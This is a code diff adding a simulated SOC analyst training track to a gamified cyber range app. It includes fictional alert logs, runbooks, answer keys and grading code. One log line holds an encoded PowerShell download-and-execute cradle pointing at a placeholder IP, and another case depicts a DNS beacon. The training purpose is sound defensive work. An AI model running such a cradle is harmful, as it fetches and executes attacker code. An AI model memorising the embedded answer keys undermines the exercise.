+{id:"mgmt",short:"svc_mgmt",label:"svc_mgmt, the management account that ran the signed inventory script",good:false}
+],
+actions:[
+{id:"escalate-mal",label:"Escalate to malware IR and isolate WKS-22"},
+{id:"close-fp",label:"Close as the normal inventory PowerShell script"},
+{id:"allow",label:"Allowlist powershell.exe -enc so the alert stops"},
+{id:"wipe-logs",label:"Delete the Sysmon logs and move on"}
+],
+logs:[
+"14:02:18 WKS-04 Sysmon 1 user=svc_mgmt parent=svchost.exe image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe command=powershell.exe -File C:\\Windows\\Admin\\inventory.ps1 signed=yes",
+"15:06:11 WKS-22 Sysmon 1 user=r.diaz parent=WINWORD.EXE image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe command=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhAC4AcABzADEAJwApAA== signed=yes",
+"15:06:22 SIEM decoder host=WKS-22 user=r.diaz DecodedCommand=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')",
+"15:06:23 WKS-22 Sysmon 3 user=r.diaz image=powershell.exe dst=203.0.113.50 dport=80 proto=tcp",
+"15:06:24 WKS-22 Sysmon 1 user=r.diaz parent=WINWORD.EXE image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE signed=yes",
+"15:07:01 PROXY user=r.diaz host=WKS-22 GET http://203.0.113.50/a.ps1 200"
+]},
+{id:"soc-dns",title:"DNS beacon from one workstation",diff:"Advanced",reward:55,badge:"Beacon Breaker",severity:"high",time:"2026-11-18 16:18:20",source:"DNS",rule:"Possible DNS beacon",entity:"WKS-09",techid:"T1071.004",tech:"DNS",
+disposition:"true-positive",action:"isolate-block",
+brief:"WKS-09 is querying a domain with a new random label every minute. Decide if this is one infected endpoint or something you must hand off before containing.",
+runbook:"Runbook DNS-C2: If one endpoint beacons and no credential was used, the L1 disposition is true positive: isolate that host, block the domain, and note the sample for L2. Escalate instead when a second host queries the same domain or the account was used elsewhere.",
+hint:"Compare the process path with a real Windows binary, then see how many hosts queried update-cdn.test.",
+debrief:"The binary is C:\\Users\\Public\\dllhost.exe, not the real System32 copy, and it was started by an unsigned file in Temp. Queries to random labels of update-cdn.test go out every 60 seconds and resolve to 203.0.113.15. No other host asked for that domain, and no new logon is in this case, so L1 contains it: isolate WKS-09 and block the domain. dc01.globex.example is ordinary name resolution.",
+dispositionNote:"True positive. One host is beaconing and the runbook tells L1 to contain it. A second host or a stolen logon would be an escalate.",
+verdictNote:"Verdict: true positive.",
+actionNote:"Isolate WKS-09 and block update-cdn.test. Leaving the host online is not the runbook.",
+iocNote:"The domain, the masquerading binary, and 203.0.113.15 are indicators. The internal DNS name dc01.globex.example is normal.",
+justify:{minlen:24,groups:[["dns","beacon","update-cdn.test","txt"],["wks-09","dllhost","l.berg","203.0.113.15"]],note:"Mention the DNS beacon or update-cdn.test, and the host WKS-09, dllhost, l.berg, or 203.0.113.15."},
+who:{groups:[["l.berg","wks-09"]],note:"Who: l.berg or WKS-09."},
+what:{groups:[["dns","beacon","c2","command and control"]],note:"What: a DNS beacon or command-and-control traffic."},
+when:{groups:[["16:1","16:18"]],note:"When: 16:18 UTC, or the queries that repeat through 16:20."},
+where:{groups:[["wks-09"]],note:"Where: WKS-09."},
+why:{groups:[["masquerad","dllhost","public","unsigned","beacon","interval","temp"]],note:"Why it is malicious: the binary is masquerading in Public or Temp, or the queries repeat on a timer."},
+host:{groups:[["wks-09"]],note:"Affected host: WKS-09."},
+user:{groups:[["l.berg"]],note:"Affected user: l.berg."},
+iocs:[
+{id:"domain",short:"update-cdn.test",label:"Domain update-cdn.test",good:true},
+{id:"path",short:"C:\\Users\\Public\\dllhost.exe",label:"C:\\Users\\Public\\dllhost.exe (not System32)",good:true},
+{id:"ip",short:"203.0.113.15",label:"203.0.113.15, the address the beacon resolves to",good:true},
+{id:"corp",short:"dc01.globex.example",label:"dc01.globex.example as a malicious domain",good:false}
+],
+actions:[
+{id:"isolate-block",label:"Isolate WKS-09 and block update-cdn.test"},
+{id:"close-fp",label:"Close as normal name resolution"},
+{id:"ignore",label:"Note it and leave WKS-09 online"},
+{id:"wipe-dc",label:"Rebuild every domain controller"}
+],
+logs:[
+"16:17:40 WKS-09 Sysmon 1 user=l.berg image=C:\\Users\\Public\\dllhost.exe parent=C:\\Users\\l.berg\\AppData\\Local\\Temp\\upd.exe signed=no",
+"16:18:01 WKS-09 Sysmon 22 dns query=dc01.globex.example type=A answer=10.1.0.5",
+"16:18:20 WKS-09 Sysmon 22 dns query=a1b2c3.update-cdn.test type=A answer=203.0.113.15 process=C:\\Users\\Public\\dllhost.exe",
+"16:19:20 WKS-09 Sysmon 22 dns query=c3d4e5.update-cdn.test type=TXT answer=203.0.113.15 process=C:\\Users\\Public\\dllhost.exe",
+"16:20:20 WKS-09 Sysmon 22 dns query=e5f607.update-cdn.test type=A answer=203.0.113.15 process=C:\\Users\\Public\\dllhost.exe",
+"16:21:20 WKS-09 Sysmon 22 dns query=778899.update-cdn.test type=TXT answer=203.0.113.15 process=C:\\Users\\Public\\dllhost.exe",
+"16:22:00 SIEM hunt domain=update-cdn.test last=24h hosts=WKS-09 only",
+"16:22:05 AUTH hunt user=l.berg new_logon=none"
+]}
 ]
 };
 /* ---------- helpers ---------- */
@@ -285,7 +646,7 @@ var S={name:"Ashley",xp:0,redXp:0,blueXp:0,placement:null,completed:[],hardMode:
 tab:"home",quizSet:null,quizIdx:0,quizPicks:[],quizDone:false,
 dailyKey:"",dailySet:null,dailyPicks:null,dailyChecked:false,dailyMsg:"",
 labProg:{},inputs:{},revealed:[],selectedLab:null,selectedCampaign:null,diffFilter:"All",
-scnCur:null,scnPicks:[null,null],scnDone:false,board:[],levelUp:"",theme:"dark",notice:null};
+scnCur:null,scnPicks:[null,null],scnDone:false,board:[],levelUp:"",theme:"dark",notice:null,socCase:null,soc:{}};
 
 var SAVE_KEY="cyberrange_academy_v2";
 var EXPORT_APP="CyberRange Academy";
@@ -375,6 +736,7 @@ function applyImported(p){
  S.labProg={};S.inputs={};S.revealed=[];
  S.selectedLab=null;S.selectedCampaign=null;
  S.scnCur=null;S.scnPicks=[null,null];S.scnDone=false;S.board=[];S.levelUp="";
+ S.socCase=null;S.soc={};
 }
 function importProgressText(text){
  var data;
@@ -488,6 +850,7 @@ function resetAll(){
  S.dailyLast="";S.dailyStreak=0;S.dailyKey="";S.dailySet=null;S.dailyPicks=null;S.dailyChecked=false;S.dailyMsg="";S.thmMode=false;
  S.quizSet=null;S.quizIdx=0;S.quizPicks=[];S.quizDone=false;S.labProg={};S.inputs={};S.revealed=[];
  S.selectedLab=null;S.selectedCampaign=null;S.diffFilter="All";S.scnCur=null;S.scnPicks=[null,null];S.scnDone=false;S.board=[];S.levelUp="";
+ S.socCase=null;S.soc={};
  try{localStorage.removeItem(SAVE_KEY);}catch(e){}
  render();
 }
@@ -500,6 +863,10 @@ function badges(){
  if(red>0)add("First Blood");
  if(red>0&&blue>0)add("Purple Team");
  DATA.campaigns.forEach(function(c){if(c.stages.every(function(s){return S.completed.indexOf(s.id)>-1;}))add(c.badge);});
+ var socN=0;
+ if(DATA.soc){DATA.soc.forEach(function(c){if(S.completed.indexOf(c.id)>-1){socN++;if(c.badge)add(c.badge);}});}
+ if(socN>0)add("Queue Clear");
+ if(DATA.soc&&socN===DATA.soc.length)add("Shift Lead");
  if(S.scnWins>0)add("Scenario Runner");
  if(S.xp>=2200)add("Legend");
  return Object.keys(set);
@@ -623,10 +990,15 @@ function viewAttack(){
  });
  return html;
 }
+function completedLabCount(){
+ var n=0;
+ S.completed.forEach(function(id){if(LAB_INDEX[id])n++;});
+ return n;
+}
 function leaderboardRows(){
  var youName=(S.name||"").replace(/\s+/g," ").trim()||"Operator";
  var rows=DATA.rivals.map(function(r){return {name:r.name,xp:r.xp,labs:r.labs,you:false,rank:rankFor(r.xp).name};});
- rows.push({name:youName,xp:S.xp,labs:S.completed.length,you:true,rank:rankFor(S.xp).name});
+ rows.push({name:youName,xp:S.xp,labs:completedLabCount(),you:true,rank:rankFor(S.xp).name});
  rows.sort(function(a,b){if(b.xp!==a.xp)return b.xp-a.xp;if(a.you!==b.you)return a.you?-1:1;if(a.name<b.name)return -1;if(a.name>b.name)return 1;return 0;});
  return rows;
 }
@@ -641,7 +1013,7 @@ function viewLeaderboard(){
  return html;
 }
 function renderNav(){
- var tabs=[["home","Home / Profile"],["ladder","Leaderboard"],["daily","Daily"],["attack","ATT&CK"],["quiz","Placement Quiz"],["red","Red Team"],["blue","Blue Team"],["scenario","Live Scenario"],["campaigns","Campaigns"]];
+ var tabs=[["home","Home / Profile"],["ladder","Leaderboard"],["daily","Daily"],["attack","ATT&CK"],["quiz","Placement Quiz"],["red","Red Team"],["blue","Blue Team"],["soc","SOC Analyst"],["scenario","Live Scenario"],["campaigns","Campaigns"]];
  document.getElementById("nav").innerHTML=tabs.map(function(t){return '<button class="btn'+(S.tab===t[0]?" active":"")+'" data-action="tab" data-tab="'+t[0]+'">'+t[1]+'</button>';}).join("");
 }
 function renderLevelUp(){
@@ -668,7 +1040,7 @@ function viewHome(){
  html+='<div class="card"><h3>Badges</h3>';
  if(bl.length===0)html+='<p class="sec" style="margin-top:8px">No badges yet. Take the placement quiz and clear a lab to start earning them.</p>';
  else html+='<div class="row" style="margin-top:10px">'+bl.map(function(b){return chip(b,"--acc","--accsub");}).join("")+'</div>';
- html+='<p class="muted" style="margin-top:10px">Earnable includes: First Blood, Injection Master, XSS Hunter, Cracked It, Phish Spotter, Recon Ranger, Path Finder, Reference Breaker, Root Cause, Smooth Talker, Log Hunter, Mail Marshal, Firewall Architect, IR Commander, IOC Analyst, Sample Slayer, Correlation Ace, Fortifier, Packet Hunter, Purple Team, Red Dawn Victor, Zero Hour Hero, Scenario Runner, Placement Pro, and Legend (2200+ XP).</p></div>';
+ html+='<p class="muted" style="margin-top:10px">Earnable includes: First Blood, Injection Master, XSS Hunter, Cracked It, Phish Spotter, Recon Ranger, Path Finder, Reference Breaker, Root Cause, Smooth Talker, Log Hunter, Mail Marshal, Firewall Architect, IR Commander, IOC Analyst, Sample Slayer, Correlation Ace, Fortifier, Packet Hunter, Purple Team, Red Dawn Victor, Zero Hour Hero, Scenario Runner, Placement Pro, Legend (2200+ XP), Queue Clear, Inbox Analyst, Beacon Breaker, and Shift Lead (close every SOC case).</p></div>';
  html+='<div class="card"><h3>Mission log (this session)</h3>';
  if(S.board.length===0)html+='<p class="sec" style="margin-top:8px">Nothing logged yet.</p>';
  else html+='<div class="col" style="gap:6px;margin-top:10px">'+S.board.map(function(e){return '<div class="row" style="justify-content:space-between"><span class="sec">'+esc(e.label)+'</span><span style="font-family:var(--mono);color:var('+(e.xp>=0?"--suc":"--dng")+')">'+(e.xp>=0?"+":"")+e.xp+' XP</span></div>';}).join("")+'</div>';
@@ -827,6 +1199,262 @@ function viewCampaigns(){
  return intro+'<div class="grid">'+DATA.campaigns.map(campaignCard).join("")+'</div>';
 }
 
+/* ---------- SOC analyst track ---------- */
+function socById(id){
+ var found=null;
+ (DATA.soc||[]).forEach(function(c){if(c.id===id)found=c;});
+ return found;
+}
+function socState(id){
+ if(!S.soc[id])S.soc[id]={disposition:"",justification:"",who:"",what:"",when:"",where:"",why:"",host:"",user:"",verdict:"",action:"",iocs:{},inds:{},logQ:"",hintUsed:false,showHint:false,result:null};
+ return S.soc[id];
+}
+function normSoc(s){return String(s||"").toLowerCase().replace(/\s+/g," ").trim();}
+function hasTerm(text, term){
+ var from=0;
+ while(from<text.length){
+  var i=text.indexOf(term, from);
+  if(i<0)return false;
+  var lead=text.slice(Math.max(0,i-4), i);
+  var neg=lead.slice(-2)==="un" || lead.slice(-4)==="not " || lead.slice(-3)==="non";
+  if(!neg)return true;
+  from=i+term.length;
+ }
+ return false;
+}
+function textMiss(val, rule){
+ if(!rule)return "";
+ var text=normSoc(val);
+ if(rule.minlen && text.length<rule.minlen)return rule.note;
+ var groups=rule.groups||[];
+ for(var g=0;g<groups.length;g++){
+  var ok=false;
+  for(var i=0;i<groups[g].length;i++){if(hasTerm(text, groups[g][i])){ok=true;break;}}
+  if(!ok)return rule.note;
+ }
+ return "";
+}
+function setProblems(list, picked){
+ var missed=[], extra=[];
+ (list||[]).forEach(function(i){
+  var on=!!(picked&&picked[i.id]);
+  if(i.good&&!on)missed.push(i.short);
+  if(!i.good&&on)extra.push(i.short);
+ });
+ if(!missed.length&&!extra.length)return "";
+ var msg="";
+ if(missed.length)msg+="Missing: "+missed.join(", ")+". ";
+ if(extra.length)msg+="Should not be listed: "+extra.join(", ")+".";
+ return msg.trim();
+}
+function gradeSoc(c, st){
+ var items=[];
+ function add(label, pass, note){items.push({label:label,pass:!!pass,note:note||""});}
+ add("Disposition", st.disposition===c.disposition, c.dispositionNote);
+ add("Justification", textMiss(st.justification, c.justify)==="", c.justify.note);
+ add("Who", textMiss(st.who, c.who)==="", c.who.note);
+ add("What", textMiss(st.what, c.what)==="", c.what.note);
+ add("When", textMiss(st.when, c.when)==="", c.when.note);
+ add("Where", textMiss(st.where, c.where)==="", c.where.note);
+ add("Why", textMiss(st.why, c.why)==="", c.why.note);
+ add("Affected host", textMiss(st.host, c.host)==="", c.host.note);
+ add("Affected user", textMiss(st.user, c.user)==="", c.user.note);
+ var iocDetail=setProblems(c.iocs, st.iocs);
+ add("IOCs", iocDetail==="", c.iocNote+(iocDetail?(" "+iocDetail):""));
+ if(c.indicators){
+  var indDetail=setProblems(c.indicators, st.inds);
+  add("Email indicators", indDetail==="", (c.indicatorNote||"")+(indDetail?(" "+indDetail):""));
+ }
+ add("Verdict", st.verdict===c.disposition, c.verdictNote);
+ add("Recommended action", st.action===c.action, c.actionNote);
+ var score=0;
+ items.forEach(function(it){if(it.pass)score++;});
+ return {ok:score===items.length,score:score,total:items.length,items:items};
+}
+function readSocForm(c){
+ var st=socState(c.id);
+ var root=document.getElementById("soc-case");
+ if(!root)return st;
+ ["justification","who","what","when","where","why","host","user","verdict"].forEach(function(k){
+  var el=root.querySelector("[data-soc-field='"+k+"']");
+  if(el)st[k]=el.value;
+ });
+ var d=root.querySelector("input[name='soc-disposition']:checked");
+ st.disposition=d?d.value:"";
+ var act=root.querySelector("input[name='soc-action']:checked");
+ st.action=act?act.value:"";
+ st.iocs={};
+ c.iocs.forEach(function(i){
+  var el=root.querySelector("[data-soc-ioc='"+i.id+"']");
+  st.iocs[i.id]=!!(el&&el.checked);
+ });
+ st.inds={};
+ (c.indicators||[]).forEach(function(i){
+  var el=root.querySelector("[data-soc-ind='"+i.id+"']");
+  st.inds[i.id]=!!(el&&el.checked);
+ });
+ var q=root.querySelector("[data-soc-log]");
+ if(q)st.logQ=q.value;
+ return st;
+}
+function socSubmit(){
+ var c=socById(S.socCase);
+ if(!c)return;
+ var st=readSocForm(c);
+ var graded=gradeSoc(c, st);
+ st.result=graded;
+ if(graded.ok&&S.completed.indexOf(c.id)===-1){
+  S.completed.push(c.id);
+  award(Math.round(c.reward*hm()),"SOC case closed - "+c.title,"blue");
+  var msg="Case closed: "+c.title+".";
+  if(c.badge)msg+=" Badge: "+c.badge+".";
+  var n=0;
+  DATA.soc.forEach(function(x){if(S.completed.indexOf(x.id)>-1)n++;});
+  if(n===1)msg+=" Badge: Queue Clear.";
+  if(n===DATA.soc.length)msg+=" Badge: Shift Lead.";
+  S.levelUp=msg;
+  save();
+ }
+ render();
+}
+function socHint(){
+ var c=socById(S.socCase);
+ if(!c)return;
+ var st=readSocForm(c);
+ st.showHint=true;
+ if(!st.hintUsed){
+  st.hintUsed=true;
+  award(-hintCost(),"Hint used - "+c.title,"");
+ }
+ render();
+}
+function sevVar(s){return s==="critical"?"--dng":s==="high"?"--wrn":s==="medium"?"--acc":"--suc";}
+function sevSub(s){return s==="critical"?"--dngsub":s==="high"?"--wrnsub":s==="medium"?"--accsub":"--sucsub";}
+function socStatus(c){
+ if(S.completed.indexOf(c.id)>-1)return "Closed";
+ var st=S.soc[c.id];
+ if(st&&(st.result||st.disposition||st.justification||st.who))return "In progress";
+ return "New";
+}
+function socLogsHtml(c, q){
+ var query=normSoc(q);
+ var lines=[];
+ c.logs.forEach(function(line){if(!query||normSoc(line).indexOf(query)!==-1)lines.push(line);});
+ var meta='<p class="muted" id="soc-log-meta">Showing '+lines.length+" of "+c.logs.length+"</p>";
+ if(!lines.length)return meta+'<p class="sec">No log lines match that filter.</p>';
+ return meta+'<table class="siem"><tbody>'+lines.map(function(line){return '<tr><td class="ev">'+esc(line)+'</td></tr>';}).join("")+"</tbody></table>";
+}
+function paintSocLogs(){
+ var c=socById(S.socCase);
+ var box=document.getElementById("soc-logs");
+ if(!c||!box)return;
+ box.innerHTML=socLogsHtml(c, socState(c.id).logQ);
+}
+function socField(name, label, value, placeholder){
+ return '<label class="fld">'+esc(label)+'<input class="wide" type="text" data-soc-field="'+name+'" value="'+esc(value||"")+'" placeholder="'+esc(placeholder||"")+'" autocomplete="off"></label>';
+}
+function socArea(name, label, value, placeholder){
+ return '<label class="fld">'+esc(label)+'<textarea data-soc-field="'+name+'" placeholder="'+esc(placeholder||"")+'" autocomplete="off">'+esc(value||"")+'</textarea></label>';
+}
+function socChecks(list, attr, picked){
+ return (list||[]).map(function(i){
+  var on=!!(picked&&picked[i.id]);
+  return '<label class="chk"><input type="checkbox" data-'+attr+'="'+i.id+'"'+(on?" checked":"")+'> <span>'+esc(i.label)+'</span></label>';
+ }).join("");
+}
+function socEmailHtml(e){
+ if(!e)return "";
+ var h='<div class="card"><h3>Reported message</h3><div class="subcard email" style="margin-top:10px"><pre>'+esc(e.raw)+'</pre>';
+ if(e.links&&e.links.length){
+  h+='<p class="muted" style="margin-top:8px">Links</p>';
+  e.links.forEach(function(link){h+='<p style="font-family:var(--mono);font-size:12px;word-break:break-all">'+esc(link)+'</p>';});
+ }
+ if(e.attachment){
+  h+='<p style="margin-top:8px"><span class="muted">Attachment</span> '+esc(e.attachment.name)+'</p>';
+  h+='<p style="font-family:var(--mono);font-size:12px;word-break:break-all">SHA256 '+esc(e.attachment.sha256)+'</p>';
+ }else h+='<p class="muted" style="margin-top:8px">No attachment.</p>';
+ h+='</div></div>';
+ return h;
+}
+function socResultHtml(c, st){
+ var g=st.result;
+ if(!g)return "";
+ var gain=Math.round(c.reward*hm());
+ var head=g.ok?("All "+g.total+" checks passed. "+c.debrief+" Blue XP for this case: +"+gain+" (awarded once)."):(g.score+" of "+g.total+" checks passed. Fix the misses and submit again. Blue XP is awarded only when every check passes.");
+ var list=g.items.map(function(it){
+  return '<div class="subcard"><div class="row">'+chip(it.pass?"Pass":"Miss",it.pass?"--suc":"--dng",it.pass?"--sucsub":"--dngsub")+'<strong>'+esc(it.label)+'</strong></div>'+(it.note&&!it.pass?'<p class="sec" style="margin-top:6px">'+esc(it.note)+'</p>':"")+'</div>';
+ }).join("");
+ return '<div class="card" id="soc-result">'+fb(head,g.ok?"ok":"err")+'<div class="col" style="gap:8px;margin-top:12px">'+list+'</div></div>';
+}
+function viewSocQueue(){
+ var done=0;
+ DATA.soc.forEach(function(c){if(S.completed.indexOf(c.id)>-1)done++;});
+ var html='<div class="card"><h2>SOC Analyst</h2><p class="sec" style="margin-top:8px">A simulated L1 shift. Alerts, logs, and messages are fictional, and this page does not call a SIEM or the network. Triage each alert, search that case\'s logs, and file the L1 report. A fully correct report awards blue XP once. Hard mode multiplies that reward. Closed case ids are stored with your other completed work, so Export/Import keeps them.</p>';
+ html+='<div class="col" style="gap:8px;margin-top:12px">';
+ html+='<div class="subcard"><strong>False positive.</strong> <span class="sec">The activity is authorized or benign. Close it.</span></div>';
+ html+='<div class="subcard"><strong>True positive.</strong> <span class="sec">It is malicious or against policy, and the case runbook tells L1 to contain it.</span></div>';
+ html+='<div class="subcard"><strong>Escalate.</strong> <span class="sec">A true incident the runbook sends to IR, malware, or identity.</span></div>';
+ html+='</div><p class="muted" style="margin-top:10px">Closed '+done+" of "+DATA.soc.length+".</p></div>";
+ html+='<div class="card" style="overflow-x:auto"><table class="siem"><thead><tr><th>Severity</th><th>Time (UTC)</th><th>Source</th><th>Rule</th><th>Status</th><th></th></tr></thead><tbody>';
+ html+=DATA.soc.map(function(c){
+  var status=socStatus(c);
+  var tone=status==="Closed"?"--suc":status==="In progress"?"--acc":"--tx3";
+  return "<tr><td>"+chip(c.severity,sevVar(c.severity),sevSub(c.severity))+"</td><td class=\"mono\">"+esc(c.time)+"</td><td>"+esc(c.source)+"</td><td>"+esc(c.rule)+"<div class=\"muted\">"+esc(c.entity)+"</div></td><td>"+chip(status,tone,"--sub")+"</td><td><button class=\"btn\" data-action=\"soc-open\" data-case=\""+c.id+"\">Open</button></td></tr>";
+ }).join("");
+ html+="</tbody></table></div>";
+ return html;
+}
+function viewSocCase(c){
+ var st=socState(c.id);
+ var closed=S.completed.indexOf(c.id)>-1;
+ var gain=Math.round(c.reward*hm());
+ var dispositions=[{id:"false-positive",label:"False positive"},{id:"true-positive",label:"True positive"},{id:"escalate",label:"Escalate"}];
+ var html='<div id="soc-case"><div class="row" style="margin-bottom:4px"><button class="btn" data-action="soc-back">Back to queue</button>'+chip(c.severity,sevVar(c.severity),sevSub(c.severity))+chip(c.diff,diffVar(c.diff),"--sub")+chip("+"+gain+" blue XP","--acc","--accsub")+(closed?chip("Closed","--suc","--sucsub"):"")+"</div>";
+ html+='<div class="card"><h2>'+esc(c.title)+'</h2>';
+ html+='<p class="sec" style="margin-top:8px">ATT&CK <a href="'+esc(attackUrl(c.techid))+'" target="_blank" rel="noopener noreferrer">'+esc(c.techid)+" "+esc(c.tech)+"</a></p>";
+ html+='<div class="grid2" style="margin-top:12px"><div class="subcard"><p class="muted">Time (UTC)</p><p>'+esc(c.time)+'</p></div><div class="subcard"><p class="muted">Source</p><p>'+esc(c.source)+'</p></div><div class="subcard"><p class="muted">Rule</p><p>'+esc(c.rule)+'</p></div><div class="subcard"><p class="muted">Entity</p><p>'+esc(c.entity)+'</p></div></div>';
+ html+='<p class="sec" style="margin-top:12px">'+esc(c.brief)+"</p></div>";
+ html+='<div class="card"><h3>L1 runbook excerpt</h3><p class="sec" style="margin-top:8px">'+esc(c.runbook)+"</p></div>";
+ if(closed)html+='<div class="card" style="background:var(--sucsub);border-color:var(--suc)"><h3 style="color:var(--suc)">Case closed</h3><p class="sec" style="margin-top:8px">Blue XP was already awarded for this case. The logs stay available for review.</p></div>';
+ html+=socEmailHtml(c.email);
+ html+='<div class="card"><h3>Logs</h3><p class="muted" style="margin-top:6px">Substring filter. Try an event id, host, user, or IP.</p><input class="wide" type="text" data-soc-log="1" value="'+esc(st.logQ||"")+'" placeholder="Filter logs" autocomplete="off" style="margin-top:8px"><div id="soc-logs" style="margin-top:10px">'+socLogsHtml(c, st.logQ)+"</div></div>";
+ html+='<div class="card"><h3>Triage</h3><p class="sec" style="margin-top:8px">Choose the queue decision, then justify it with evidence from the logs.</p><div style="margin-top:8px">';
+ html+=dispositions.map(function(o){
+  return '<label class="chk"><input type="radio" name="soc-disposition" value="'+o.id+'"'+(st.disposition===o.id?" checked":"")+'> <span>'+esc(o.label)+"</span></label>";
+ }).join("");
+ html+="</div>"+socArea("justification","Justification",st.justification,"One or two sentences citing the host, account, ticket, or log event.")+"</div>";
+ html+='<div class="card"><h3>L1 case report</h3><p class="sec" style="margin-top:8px">The five Ws, the affected host and user, the indicators, a verdict, and the action the runbook asks for. All checks must pass.</p>';
+ html+='<div class="formgrid" style="margin-top:12px">'+socField("who","Who",st.who,"Account, sender, or source")+'</div>';
+ html+='<div class="formgrid">'+socField("what","What",st.what,"What happened")+socField("when","When",st.when,"Time from the alert or logs")+socField("where","Where",st.where,"Host or service")+socField("why","Why",st.why,"Why it is or is not malicious")+"</div>";
+ html+='<div class="formgrid">'+socField("host","Affected host",st.host,"Hostname")+socField("user","Affected user",st.user,"Account")+"</div>";
+ html+='<p class="muted" style="margin-top:12px">IOCs to record</p>'+socChecks(c.iocs,"soc-ioc",st.iocs);
+ if(c.indicators){
+  html+='<p class="muted" style="margin-top:12px">'+esc(c.indicatorPrompt||"Email indicators")+"</p>"+socChecks(c.indicators,"soc-ind",st.inds);
+ }
+ html+='<div class="formgrid" style="margin-top:12px"><label class="fld">Verdict<select data-soc-field="verdict">';
+ html+='<option value=""'+(st.verdict===""?" selected":"")+'>Select a verdict</option>';
+ html+=dispositions.map(function(o){return '<option value="'+o.id+'"'+(st.verdict===o.id?" selected":"")+'>'+esc(o.label)+"</option>";}).join("");
+ html+="</select></label></div>";
+ html+='<p class="muted" style="margin-top:12px">Recommended action</p>';
+ html+=(c.actions||[]).map(function(o){
+  return '<label class="chk"><input type="radio" name="soc-action" value="'+o.id+'"'+(st.action===o.id?" checked":"")+'> <span>'+esc(o.label)+"</span></label>";
+ }).join("");
+ html+='<div class="row" style="margin-top:12px"><button class="btn primary" data-action="soc-submit">Submit case report</button><button class="btn" data-action="soc-hint">Hint (-'+hintCost()+' XP)</button></div>';
+ if(st.showHint)html+='<div style="margin-top:12px">'+fb("Hint: "+c.hint,"")+"</div>";
+ html+="</div>";
+ html+=socResultHtml(c, st);
+ html+="</div>";
+ return html;
+}
+function viewSoc(){
+ if(S.socCase){
+  var c=socById(S.socCase);
+  if(c)return viewSocCase(c);
+  S.socCase=null;
+ }
+ return viewSocQueue();
+}
+
 /* ---------- render + events ---------- */
 function render(){
  document.documentElement.setAttribute("data-theme",S.theme);
@@ -841,6 +1469,7 @@ function render(){
  else if(S.tab==="quiz")c.innerHTML=viewQuiz();
  else if(S.tab==="red")c.innerHTML=viewSide("red");
  else if(S.tab==="blue")c.innerHTML=viewSide("blue");
+ else if(S.tab==="soc")c.innerHTML=viewSoc();
  else if(S.tab==="scenario")c.innerHTML=viewScenario();
  else if(S.tab==="campaigns")c.innerHTML=viewCampaigns();
 }
@@ -875,6 +1504,10 @@ document.addEventListener("click",function(e){
  else if(a==="daily-submit"){submitDaily();}
  else if(a==="scn-gen"){generateScenario();}
  else if(a==="scn-pick"){answerScn(parseInt(t.getAttribute("data-qi"),10),parseInt(t.getAttribute("data-oi"),10));}
+ else if(a==="soc-open"){S.socCase=t.getAttribute("data-case");render();}
+ else if(a==="soc-back"){S.socCase=null;render();}
+ else if(a==="soc-submit"){socSubmit();}
+ else if(a==="soc-hint"){socHint();}
 });
 document.addEventListener("change",function(e){
  var t=e.target;if(!t||!t.getAttribute||t.getAttribute("data-import")!=="1")return;
@@ -886,6 +1519,7 @@ document.addEventListener("input",function(e){
  var t=e.target;if(!t)return;
  if(t.getAttribute&&t.getAttribute("data-action")==="name"){S.name=t.value;save();var st=document.getElementById("subtitle");if(st)st.textContent="A gamified, fully simulated cyber range for "+(S.name||"operators")+". Progress saves to this browser.";}
  else if(t.getAttribute&&t.getAttribute("data-term")){S.inputs[t.getAttribute("data-term")]=t.value;}
+ else if(t.getAttribute&&t.getAttribute("data-soc-log")==="1"){if(S.socCase){socState(S.socCase).logQ=t.value;paintSocLogs();}}
 });
 document.addEventListener("keydown",function(e){
  var t=e.target;if(t&&t.getAttribute&&t.getAttribute("data-term")&&e.key==="Enter"){e.preventDefault();submitTerminal(LAB_INDEX[t.getAttribute("data-term")]);}
